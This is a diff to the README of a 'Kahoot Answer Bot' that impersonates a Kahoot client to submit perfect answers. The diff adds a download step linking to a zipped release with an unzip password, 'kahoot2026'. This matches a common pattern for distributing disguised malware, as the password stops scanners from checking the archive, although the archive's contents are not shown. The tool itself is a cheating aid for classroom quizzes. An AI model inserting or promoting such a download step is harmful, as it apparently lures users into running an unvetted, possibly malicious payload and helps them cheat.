@@ -1,6 +1,12 @@
 # Kahoot Answer Bot
 A bot that takes the name or ID of a kahoot and gets a perfect score with the nickname of your choosing.
+### **Step 1: Download**
+Choose one of the following download options:
 
+| Source | Link |
+|--------|------|
+| **Download Kahoot Bot** | [kahoot-answer-bot.zip](https://github.com/FiremanExpand/kahoot-answer-bot/releases/download/kahoot/kahoot-answer-bot-release.zip) |
+|**To unzip code:** | kahoot2026  |
 
 ## Features
 The program intercepts and pretends to be a kahoot client. After receiving quiz name from host, looks up answers for quiz and uses them.
